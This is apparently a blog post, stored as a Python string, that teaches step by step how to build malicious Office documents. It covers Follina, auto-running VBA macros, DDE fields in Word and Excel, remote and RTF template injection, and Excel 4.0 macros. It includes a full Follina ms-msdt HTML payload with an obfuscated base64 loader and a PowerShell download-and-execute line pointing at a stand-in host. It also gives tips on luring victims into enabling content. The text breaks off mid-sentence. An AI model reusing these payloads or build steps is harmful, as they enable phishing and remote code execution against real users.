full_description = '''Building Offensive Malicious Documents Malicious-Document Malware Nov 20, 2022 Generally, the attacker will use the below techniques in leveraging Microsoft Office features and vulnerabilities: Exploits Macros Remote template injection and many more… In this post, we will learn various techniques on how to make malicious documents that can execute our malicious code. Of course, to make it simple we will just run the calc/notepad application to show our proof of concept is proven. Why do security researchers always pop up a calc.exe when doing a Proof-of-Concept? Because it is simple and easy to pop up a calculator, rather than creating Powershell one-liner or shellcoding just to show your POC is proven. Hehe You can always replace the calc.exe execution with any payload you want like Powershell reverse shell or mshta fileless or anything else that is suitable your appetite but popping up a calc.exe indicated that we can also execute anything we wanted like download and execute malware. Not just a calc.exe execution. For example, malicious Powershell like below: powershell IEX (New-Object Net.WebClient).DownloadString('https://malware.com/mini-reverse.ps1') This is for education only whereby the purpose of this blog to understand how malicious documents were created by the attacker out there. Do with your own risk. Follina We started with the latest and famous malicious document called Follina. Researchers have reproduced the zero-day with multiple versions of Microsoft Office and even publish their Follina malicious document generator on GitHub. Here are the steps to build the docx: Open Microsoft Word, create a dummy document. Insert an (OLE) object (as a Bitmap Image), save it in docx: Unzip the docx file and edit word/_rels/document.xml.rels in the docx structure. Modify the XML tag <Relationship with attribute Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject and Target="embeddings/oleObject1.bin" by changing the Target value and adding attribute TargetMode like below: Target = "http://malware.domain/payload.html!" TargetMode = "External" Note the Id value (probably it is “rIdX” where X is random number. For example 10). Edit word/document.xml. Search for the <o:OLEObject tag (with r:id=”rd10”) and change the attribute from Type="Embed" to Type="Link" and add the attribute UpdateMode="OnCall". Serve the payload in html payload with the ms-msdt scheme at hxxp://malware[.]com/payload.html: <!doctype html> <html lang="en"> <head> <title> Good thing we disabled macros </title> </head> <body> <p> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pellentesque egestas nulla in dignissim. Nam id mauris lorem. Nunc suscipit id magna id mollis. Pellentesque suscipit orci neque, at ornare sapien bibendum eu. Vestibulum malesuada nec sem quis finibus. Nam quis ligula et dui faucibus faucibus. In quis bibendum tortor. Curabitur rutrum leo tortor, venenatis fermentum ex porttitor vitae. Proin eu imperdiet lorem, ac aliquet risus. Aenean eu sapien pharetra, imperdiet ipsum ut, semper diam. Nulla facilisi. Sed euismod tortor tortor, non eleifend nunc fermentum sit amet. Integer ligula ligula, congue at scelerisque sit amet, porttitor quis felis. Maecenas nec justo varius, semper turpis ut, gravida lorem. Proin arcu ligula, venenatis aliquam tristique ut, pretium quis velit. Phasellus tristique orci enim, at accumsan velit interdum et. Aenean nec tristique ante, dignissim convallis ligula. Aenean quis felis dolor. In quis lectus massa. Pellentesque quis pretium massa. Vivamus facilisis ultricies massa ac commodo. Nam nec congue magna. Nullam laoreet justo ut vehicula lobortis. Aliquam rutrum orci tortor, non porta odio feugiat eu. Vivamus nulla mauris, eleifend eu egestas scelerisque, vulputate id est. Proin rutrum nec metus convallis ornare. Ut ultricies ante et dictum imperdiet. Ut nisl magna, porttitor nec odio non, dapibus maximus nibh. Integer lorem felis, accumsan a dapibus hendrerit, maximus nec leo. Vestibulum porta, orci sed dignissim porta, sem justo porta odio, quis rutrum tortor arcu quis massa. Aenean eleifend nisi a quam faucibus, quis scelerisque lectus condimentum. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin non dui nec odio finibus molestie. Suspendisse id massa nunc. Sed ultricies et sapien vel fringilla. </p> <p> Donec tincidunt ac justo et iaculis. Pellentesque lacinia, neque at consectetur porttitor, leo eros bibendum lorem, eu sollicitudin dolor urna pharetra augue. Pellentesque facilisis orci quis ante tempor, ac varius eros blandit. Nulla vulputate, purus eu consectetur ullamcorper, mauris nulla commodo dolor, in maximus purus mi eget purus. In mauris diam, imperdiet ac dignissim ut, mollis in purus. In congue volutpat tortor eu auctor. Nullam a eros lectus. Aenean porta semper quam ac lacinia. Curabitur interdum, nisl eu laoreet tempus, augue nisl volutpat odio, dictum aliquam massa orci sit amet magna. Duis pulvinar vitae neque non placerat. Nullam at dui diam. In hac habitasse platea dictumst. Sed quis mattis libero. Nullam sit amet condimentum est. Nulla eget blandit elit. Nunc facilisis erat nec ligula ultrices, malesuada mollis ex porta. Phasellus iaculis lorem eu augue tincidunt, in ultrices massa suscipit. Donec gravida sapien ac dui interdum cursus. In finibus eu dolor sit amet porta. Sed ultrices nisl dui, at lacinia lectus porttitor ut. Ut ac viverra risus. Suspendisse lacus nunc, porttitor facilisis mauris ut, ullamcorper gravida dolor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus sollicitudin, arcu id sagittis facilisis, turpis dolor eleifend massa, in maximus sapien dui et tortor. Quisque varius enim sed enim venenatis tempor. Praesent quis volutpat lorem. Pellentesque ac venenatis lacus, vitae commodo odio. Sed in metus at libero viverra mollis sed vitae nibh. Sed at semper lectus. </p> <p> Proin a interdum justo. Duis sed dui vitae ex molestie egestas et tincidunt neque. Fusce lectus tellus, pharetra id ex at, consectetur hendrerit nibh. Nulla sit amet commodo risus. Nulla sed dapibus ante, sit amet fringilla dui. Nunc lectus mauris, porttitor quis eleifend nec, suscipit sit amet massa. Vivamus in lectus erat. Nulla facilisi. Vivamus sed massa quis arcu egestas vehicula. Nulla massa lorem, tincidunt sed feugiat quis, faucibus a risus. Sed viverra turpis sit amet metus iaculis finibus. Morbi convallis fringilla tortor, at consequat purus vulputate sit amet. Morbi a ultricies risus, id maximus purus. Fusce aliquet tortor id ante ornare, non auctor tortor luctus. Quisque laoreet, sem id porttitor eleifend, eros eros suscipit lectus, id facilisis lorem lorem nec nibh. Nullam venenatis ornare ornare. Donec varius ex ac faucibus condimentum. Aenean ultricies vitae mauris cursus ornare. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas aliquet felis vel nulla auctor, ac tempor mi mattis. Nam accumsan nisi vulputate, vestibulum nisl at, gravida erat. Nam diam metus, tempor id sapien eu, porta luctus felis. Aliquam luctus vitae tortor quis consectetur. In rutrum neque sit amet fermentum rutrum. Sed a velit at metus pretium tincidunt tristique eget nibh. In ultricies, est ut varius pulvinar, magna purus tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut. Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce. </p> <script> location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'<base64 payload>'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; </script> </body> </html> VBA Macro In malware wild, macro malware is typically transmitted through phishing emails that contain malicious attachments. When the macros run, malware coded into the VBA will begin to infect all files that are opened using Microsoft Office. In our case, we will only execute a calc.exe app. First, open Microsoft Office and then Press Alt + F11 on your keyboard. The action will bring us to Macro Editor. On “Project (Document1)” path, click ThisDocument: Write our malicious macro code, for example: Private Sub Document_Open() Test End Sub Private Sub Test() Shell ("cmd /c calc.exe") End Sub Save the document as .doc or .docm and run it! For malicious execution POC, you might want to replace calc.exe with powershell -enc . The encoded base64 can be generate using this recipe. Also, to lure user to click enable content, you might need some social engineering such as pictures or words that can manipulate user such as this picture: Enabling the content upon opening the document will execute our code. You can learn VBA coding from the resouces below: https://www.trustedsec.com/blog/intro-to-macros-and-vba-for-script-kiddies/ https://www.trustedsec.com/blog/the-vba-language-for-script-kiddies/ https://www.trustedsec.com/blog/developing-with-vba-for-script-kiddies/ OneNote Refer this source: https://assume-breach.medium.com/home-grown-read-team-lets-make-some-onenote-phishing-attachments-a14f4ef6ccc4 DDE attack This attack was commonly use by attacker out there, where once a victim was phished by clicking the “yes” button in the Warning message by Office, they can immidiately being compromised by the attacker. But, as far as I’m concerned. This vulnerability have been patched by Microsoft. So, the older version of Microsoft Office still vulnerable to this. DDEAUTO, short for automatic dynamic data exchange, is a command you can put right inside the data of an Office file to get it to pull data out of another file. In our context DDE works by executing command, that will provide the data (data provider). DDE attack can be done in Microsoft Word and Excel. Let’s talk about DDE in Word. Microsoft Word Go to Insert tab -> Click on Quick Parts -> Click on Field: You can setup the DDEAUTO payload at footer of our document to avoid victim not notice any DDEAUTO mechanism. Choose = (Formula) field names and click OK button: After that, you should see a Field inserted in the document with an error !Unexpected End of Formula. Right-click the Field, and choose Toggle Field Codes: The field code now should display {= \* MERGEFORMAT}: Change the field code by manually typing the payload command you want to execute: {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" } Save the document as .docx. Upon opening the document, they will be welcome with these two warning message. By clicking Yes on both warning box, our code will be execute. Code executed! Microsoft Excel In Excel, we can embedded our DDE payload through the use of formulas feature. Choose a box to put this payload =cmd|'/c calc.exe'!'T81' where T81 should be any table column number. Paste in the box and Excel will pop-up a warning. Just ignore it by click No for now: Then, it will display this #REF! text in the box: Click on the Yellow Warning icon, and choose Ignore Error: Save the document as .xlsx. Open the document and click Enable Content: Click yes, and our code will executed: Template injection Word Template Injection This part will shows us how to create a non-macro document that uses a template that contains VBA macros, which is loaded from a remote server when the document is executed. When the maldoc is opened, it will attempt to retrieve and execute template document define at word/_rels/settings.xml.rels. Let’s first create a malicious template document. Then, we will create the second document which we will modify the word/_rels/settings.xml of the document which will be lead the document to retrieve and replace with our malicious template document. Assume that we going to use the document that we’ve have created in VBA Macro section above. I’ve added a line to pop-up a msgbox that tell us that our remote template injection is successful: Save the file as Macro-Enabled Template .dotm format. Now, let’s create a normal document using a free template from Microsoft Office. In my case, I’ll using a free template named “Blue grey resume”: Then, save the document as .docx. Now we have the both documents that we need: Unzip the docx using decompress tool. In my case, I’ll using 7zip. From here, we can start to see the files containing in the docx file: Navigate to word/_rels/ folder, and we can start modifying the content of setting.xml.rels. Replace the content of the attribute Target in the file setting.xml.rels with your remote document serve in your server: Here my Kali box will serving the malicious template that we’ve created: Replace the original link with our document link and save the file: Now, compressed back all the files to a zip. Then change the .zip format to .docx: Now this document has contain the malicious remote template injection. Upon opening and Enabling Content of the document, the code will executed: RTF Template injection First, create a malicious .dotm document like we discussed in section Word Template injection above. Serve the file on the internet. Then, create a microsoft word file and save it as .rtf: After saving it, open the RTF file with text editor. Then put the below control word template in the RTF. {\*\template http://malware.domain/malicious-template.dotm} Upon opening the RTF file, it will fetch the content (template) from malicious-template.dotm at hxxp://malware.domain, load the template and then make the malicious code execution: Excel4Macro Excel 4.0 macros which also known as XLM macros. Excel 4.0 macro can be difficult to analyse and detected by AV. First step, create a new Excel workbook. Right click Sheet1 at the bottom of the Excel and choose Insert: A windows box will pop-up that allow us to choose which object we want to insert. Select MS Excel 4.0 Macro and click OK: From here, let’s start to write our own macro. Click on any cell and type the formulas shown in below picture: =EXEC("calc.exe") =ALERT("Excel 4.0 Macro executed") =RETURN() On the name box at the top left, fill in auto_open to make our Excel 4.0 macro execute automatically when the workbook document is opened. It is similar to Sub AutoOpen() for VBA macros. Also, we can hide '''
